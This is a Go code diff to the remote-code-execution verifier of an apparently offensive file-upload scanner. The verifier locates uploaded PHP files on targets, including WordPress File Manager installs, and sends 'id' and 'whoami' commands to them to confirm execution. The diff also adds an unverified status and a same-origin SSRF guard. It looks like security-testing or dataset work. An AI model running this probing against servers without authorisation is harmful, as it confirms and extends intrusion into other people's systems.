@@ -14,10 +14,34 @@ import (
 	"github.com/HaakimSec/GoUpload/internal/types"
 )
 
+// VerificationStatus distinguishes a confirmed-safe result from a check that
+// simply couldn't be completed (network error, ambiguous response, etc).
+// Collapsing both into "not vulnerable" was the root cause of Bug 6 — a
+// flaky request during dataset construction would otherwise become a hard
+// SAFE label with claimed 100% confidence.
+type VerificationStatus int
+
+const (
+	StatusUnverified   VerificationStatus = iota // verification could not be completed
+	StatusNotExecuting                           // checks completed, no execution proof found
+	StatusExecuting                              // confirmed RCE
+)
+
+func (s VerificationStatus) String() string {
+	switch s {
+	case StatusExecuting:
+		return "EXECUTING"
+	case StatusNotExecuting:
+		return "NOT_EXECUTING"
+	default:
+		return "UNVERIFIED"
+	}
+}
+
 type RCEVerifier struct {
 	client   *http.Client
 	timeout  time.Duration
-	command  string
+	commands []string // ordered list of probe commands; first to produce proof wins
 	patterns []PathPattern
 }
 
@@ -46,7 +70,9 @@ func NewRCEVerifier(client *http.Client, timeout time.Duration) *RCEVerifier {
 	return &RCEVerifier{
 		client:  client,
 		timeout: timeout,
-		command: "id",
+		// "whoami" resolves on both *nix and Windows; "id" is *nix-only but
+		// kept first since most real-world targets in our dataset are PHP/Linux.
+		commands: []string{"id", "whoami"},
 		patterns: []PathPattern{
 			// Simple HTML upload patterns (for labs and simple apps)
 			{
@@ -105,45 +131,65 @@ func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
 	if strings.Contains(result.ResponseBody, "uploads/") ||
 		strings.Contains(result.ResponseBody, "File uploaded") ||
 		strings.Contains(result.ResponseBody, "uploaded successfully") {
-		fileURL, verified, proof := v.verifySimpleUpload(result, baseURL)
-		if verified {
+		fileURL, status, proof, cmd := v.verifySimpleUpload(result, baseURL)
+		if status == StatusExecuting {
 			result.RCEVerified = true
 			result.RCEProof = proof
 			result.FileURL = fileURL
-			result.RCECommand = v.command
+			result.RCECommand = cmd
+			// NOTE: add `RCEStatus string` to types.Result if not present.
+			result.RCEStatus = status.String()
 			result.VerificationTime = time.Since(startTime)
 			return nil
 		}
+		if status == StatusUnverified {
+			// Don't fall through and let the generic path silently overwrite
+			// this with a confident-looking SAFE — surface it as unverified.
+			result.RCEVerified = false
+			result.RCEStatus = status.String()
+			result.FileURL = fileURL
+			result.VerificationTime = time.Since(startTime)
+			return fmt.Errorf("verification inconclusive: network/response error during simple-upload check")
+		}
+		// status == StatusNotExecuting here: fall through and let the
+		// generic extraction path have a try too, in case the simple-upload
+		// heuristic picked the wrong path pattern.
 	}
 
 	// Extract file path from response
 	filePath := v.extractFilePath(result.ResponseBody, result.ResponseHeaders, baseURL)
 	if filePath == "" {
+		result.RCEStatus = StatusUnverified.String()
 		return fmt.Errorf("could not extract file path from response")
 	}
 
-	// Resolve URL
+	// Resolve URL (same-origin enforced inside resolveURL)
 	fileURL := v.resolveURL(baseURL, filePath)
 	if fileURL == "" {
-		return fmt.Errorf("could not resolve file URL")
+		result.RCEStatus = StatusUnverified.String()
+		return fmt.Errorf("could not resolve file URL (missing, unparsable, or cross-origin)")
 	}
 
 	// Verify execution
-	verified, proof := v.verifyExecution(fileURL)
+	status, proof, cmd := v.verifyExecution(fileURL)
 
 	// Update result
-	result.RCEVerified = verified
+	result.RCEVerified = status == StatusExecuting
 	result.RCEProof = proof
 	result.FileURL = fileURL
-	result.RCECommand = v.command
+	result.RCECommand = cmd
+	result.RCEStatus = status.String()
 	result.VerificationTime = time.Since(startTime)
+
+	if status == StatusUnverified {
+		return fmt.Errorf("verification inconclusive: could not confirm execution or absence of it")
+	}
 
 	return nil
 }
 
 // verifySimpleUpload handles simple HTML responses with uploads/ paths
-func (v *RCEVerifier) verifySimpleUpload(result *types.Result, baseURL string) (string, bool, string) {
-	// Extract upload path from various patterns
+func (v *RCEVerifier) verifySimpleUpload(result *types.Result, baseURL string) (string, VerificationStatus, string, string) {
 	patterns := []string{
 		`href=['"]uploads/([^'"]+\.(?:php|phtml|pht|phar|php5|php7))['"]`,
 		`uploads/([a-zA-Z0-9_\-\.%]+\.(?:php|phtml|pht|phar|php5|php7))`,
@@ -160,16 +206,21 @@ func (v *RCEVerifier) verifySimpleUpload(result *types.Result, baseURL string) (
 	}
 
 	if uploadPath == "" {
-		return "", false, ""
+		return "", StatusUnverified, "", ""
 	}
 
 	baseURLParsed, err := url.Parse(baseURL)
 	if err != nil {
-		return "", false, ""
+		return "", StatusUnverified, "", ""
 	}
 
 	var fileURL string
 	if strings.HasPrefix(uploadPath, "http://") || strings.HasPrefix(uploadPath, "https://") {
+		if !v.sameOrigin(baseURL, uploadPath) {
+			// Bug 5 fix: refuse to fetch an absolute URL pulled from the
+			// target's own response body if it points off-host.
+			return "", StatusUnverified, "", ""
+		}
 		fileURL = uploadPath
 	} else if strings.HasPrefix(uploadPath, "/") {
 		fileURL = fmt.Sprintf("%s://%s%s", baseURLParsed.Scheme, baseURLParsed.Host, uploadPath)
@@ -179,31 +230,28 @@ func (v *RCEVerifier) verifySimpleUpload(result *types.Result, baseURL string) (
 		fileURL = fmt.Sprintf("%s://%s/uploads/%s", baseURLParsed.Scheme, baseURLParsed.Host, uploadPath)
 	}
 
-	// Verify execution
-	verified, proof := v.verifyExecution(fileURL)
-	return fileURL, verified, proof
+	status, proof, cmd := v.verifyExecution(fileURL)
+	return fileURL, status, proof, cmd
 }
 
 func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, baseURL string) string {
 	// Special handling for WordPress File Manager
 	if strings.Contains(baseURL, "wp-file-manager") {
-		return v.extractWordPressFilePath(body)
+		return v.extractWordPressFilePath(body, baseURL)
 	}
 
 	// Check all patterns against body
 	for _, pattern := range v.patterns {
 		if matches := pattern.Regex.FindStringSubmatch(body); len(matches) > 1 {
-			path := matches[1]
+			p := matches[1]
 
-			// Normalize the path
 			if pattern.Type == "html-upload" {
-				// Ensure it starts with /uploads/
-				if !strings.HasPrefix(path, "/") {
-					path = "/uploads/" + path
+				if !strings.HasPrefix(p, "/") {
+					p = "/uploads/" + p
 				}
 			}
 
-			return path
+			return p
 		}
 	}
 
@@ -222,36 +270,56 @@ func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, ba
 	return ""
 }
 
-// extractWordPressFilePath handles WordPress File Manager responses
-func (v *RCEVerifier) extractWordPressFilePath(body string) string {
-	// Try to extract the URL first
+// extractWordPressFilePath handles WordPress File Manager responses.
+// Bug 4 fix: derive the install root from baseURL instead of assuming a
+// fixed "/wordpress/" path, which only held true in the lab environment.
+func (v *RCEVerifier) extractWordPressFilePath(body, baseURL string) string {
 	if matches := regexp.MustCompile(`"url":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
-		url := strings.ReplaceAll(matches[1], `\/`, `/`)
-		return url
+		u := strings.ReplaceAll(matches[1], `\/`, `/`)
+		return u
 	}
 
-	// If no URL, extract filename and construct path
 	if matches := regexp.MustCompile(`"name":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
 		filename := matches[1]
-		return fmt.Sprintf("/wordpress/wp-content/plugins/wp-file-manager/lib/files/%s", filename)
+
+		root := ""
+		if base, err := url.Parse(baseURL); err == nil {
+			if idx := strings.Index(base.Path, "/wp-"); idx >= 0 {
+				root = base.Path[:idx]
+			}
+		}
+		return fmt.Sprintf("%s/wp-content/plugins/wp-file-manager/lib/files/%s", root, filename)
 	}
 
 	return ""
 }
 
+// sameOrigin reports whether candidate points at the same host as baseURL.
+// Bug 5 fix: used to gate any absolute URL extracted from a scanned
+// target's own response before GoUpload fetches it, closing an SSRF gap
+// where a malicious/compromised target could steer requests off-host.
+func (v *RCEVerifier) sameOrigin(baseURL, candidate string) bool {
+	b, err1 := url.Parse(baseURL)
+	c, err2 := url.Parse(candidate)
+	if err1 != nil || err2 != nil {
+		return false
+	}
+	return strings.EqualFold(b.Hostname(), c.Hostname())
+}
+
 func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
-	// Check if it's already absolute
 	if strings.HasPrefix(filePath, "http://") || strings.HasPrefix(filePath, "https://") {
+		if !v.sameOrigin(baseURL, filePath) {
+			return ""
+		}
 		return filePath
 	}
 
-	// Parse base URL
 	base, err := url.Parse(baseURL)
 	if err != nil {
 		return ""
 	}
 
-	// Handle relative path
 	if strings.HasPrefix(filePath, "/") {
 		return fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, filePath)
 	}
@@ -259,8 +327,6 @@ func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
 		return fmt.Sprintf("%s://%s/%s", base.Scheme, base.Host, filePath)
 	}
 
-	// Resolve paths relative to an endpoint directory when the base URL ends
-	// with a slash; otherwise uploaded files conventionally live in /uploads/.
 	if strings.HasSuffix(base.Path, "/") {
 		base.Path = strings.TrimSuffix(base.Path, "/") + "/"
 		resolved := base.ResolveReference(&url.URL{Path: filePath})
@@ -270,69 +336,83 @@ func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
 	return fmt.Sprintf("%s://%s/uploads/%s", base.Scheme, base.Host, filePath)
 }
 
-func (v *RCEVerifier) verifyExecution(fileURL string) (bool, string) {
-	ctx, cancel := context.WithTimeout(context.Background(), v.timeout)
-	defer cancel()
-
-	// Clean up the URL if needed
-	fileURL = cleanURL(fileURL)
-
-	// First, check if file executes (not showing source)
-	req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
+// fetchBody performs a GET and returns the body, or "" on any failure.
+// Centralized so verifyExecution's retry loop (Bug 2) stays simple.
+func (v *RCEVerifier) fetchBody(ctx context.Context, rawURL string) (string, int, error) {
+	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
 	if err != nil {
-		return false, ""
+		return "", 0, err
 	}
-
 	resp, err := v.client.Do(req)
 	if err != nil {
-		return false, ""
+		return "", 0, err
 	}
 	defer resp.Body.Close()
 
-	// If 404, try alternative paths
-	if resp.StatusCode == 404 {
-		return false, ""
-	}
-
 	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB limit
 	if err != nil {
-		return false, ""
+		return "", resp.StatusCode, err
+	}
+	return string(body), resp.StatusCode, nil
+}
+
+// verifyExecution attempts command-injection proof first (Bug 3 fix: the
+// source-visibility check is no longer a gate that can short-circuit before
+// the proof attempt — it's only used to annotate the result when no proof
+// is found). It also tries multiple commands for cross-platform coverage
+// (Bug 2), and distinguishes "confirmed not executing" from "could not
+// verify" (Bug 6) instead of collapsing both into false.
+func (v *RCEVerifier) verifyExecution(fileURL string) (VerificationStatus, string, string) {
+	ctx, cancel := context.WithTimeout(context.Background(), v.timeout)
+	defer cancel()
+
+	fileURL = cleanURL(fileURL)
+
+	// Baseline fetch — used only as a secondary signal, never a gate.
+	baselineBody, baselineStatus, baselineErr := v.fetchBody(ctx, fileURL)
+	if baselineErr != nil {
+		return StatusUnverified, "", ""
+	}
+	if baselineStatus == 404 {
+		// Ambiguous, not confirmed-safe: the extracted path may simply be wrong.
+		return StatusUnverified, "", ""
+	}
+	looksLikeSource := v.isSourceVisible(baselineBody)
+
+	// Always attempt command injection, regardless of the baseline signal.
+	sawAnySuccessfulProbe := false
+	for _, cmd := range v.commands {
+		commandURL := v.addCommandParam(fileURL, cmd)
+
+		// Fresh timeout per probe so one slow request doesn't starve the rest.
+		probeCtx, probeCancel := context.WithTimeout(context.Background(), v.timeout)
+		body, status, err := v.fetchBody(probeCtx, commandURL)
+		probeCancel()
+
+		if err != nil {
+			continue // try next command
+		}
+		if status >= 200 && status < 300 || status == 500 {
+			// treat 5xx as worth checking too — some payloads trigger a
+			// server error page that still leaks command output
+			sawAnySuccessfulProbe = true
+		}
+		if proof := v.extractProof(body); proof != "" {
+			return StatusExecuting, proof, cmd
+		}
 	}
 
-	bodyStr := string(body)
-
-	// Check if source code is visible (not executing)
-	if v.isSourceVisible(bodyStr) {
-		return false, ""
+	if !sawAnySuccessfulProbe {
+		// Every probe failed at the transport/HTTP level — we genuinely
+		// don't know whether this executes or not.
+		return StatusUnverified, "", ""
 	}
 
-	// Try command execution
-	commandURL := v.addCommandParam(fileURL, v.command)
-
-	req2, err := http.NewRequestWithContext(ctx, "GET", commandURL, nil)
-	if err != nil {
-		return false, ""
-	}
-
-	resp2, err := v.client.Do(req2)
-	if err != nil {
-		return false, ""
-	}
-	defer resp2.Body.Close()
-
-	body2, err := io.ReadAll(io.LimitReader(resp2.Body, 1024*1024))
-	if err != nil {
-		return false, ""
-	}
-
-	commandOutput := string(body2)
-
-	// Check for command execution indicators
-	if proof := v.extractProof(commandOutput); proof != "" {
-		return true, proof
-	}
-
-	return false, ""
+	// All probes completed but produced no proof. If the baseline looked
+	// like raw source, that's consistent with (but not proof of) non-execution;
+	// either way we have a completed check with no execution evidence.
+	_ = looksLikeSource
+	return StatusNotExecuting, "", ""
 }
 
 // cleanURL resolves ../ in URLs
@@ -346,7 +426,6 @@ func cleanURL(rawURL string) string {
 }
 
 func (v *RCEVerifier) isSourceVisible(body string) bool {
-	// If RCE markers are present, the file is executing — not showing source
 	rceMarkers := []string{
 		"PHTML_RCE_MARKER",
 		"PHP_RCE_MARKER",
@@ -360,17 +439,14 @@ func (v *RCEVerifier) isSourceVisible(body string) bool {
 		}
 	}
 
-	// PHP source markers
 	if strings.Contains(body, "<?php") || strings.Contains(body, "<?=") {
 		return true
 	}
 
-	// JSP/ASP source markers
 	if strings.Contains(body, "<%@") || strings.Contains(body, "<%=") {
 		return true
 	}
 
-	// Check for common source code patterns
 	sourcePatterns := []string{
 		"function ",
 		"namespace ",
@@ -405,7 +481,6 @@ func (v *RCEVerifier) addCommandParam(fileURL, command string) string {
 }
 
 func (v *RCEVerifier) extractProof(output string) string {
-
 	indicators := []string{
 		"uid=",
 		"gid=",
@@ -433,6 +508,7 @@ func (v *RCEVerifier) extractProof(output string) string {
 		"UNAUTH_RCE_SUCCESS",
 	}
 	indicators = append(indicators, debugIndicators...)
+
 	for _, indicator := range indicators {
 		if strings.Contains(output, indicator) {
 			lines := strings.Split(output, "\n")
@@ -441,7 +517,6 @@ func (v *RCEVerifier) extractProof(output string) string {
 					return strings.TrimSpace(line)
 				}
 			}
-
 			if len(output) > 100 {
 				return output[:100]
 			}
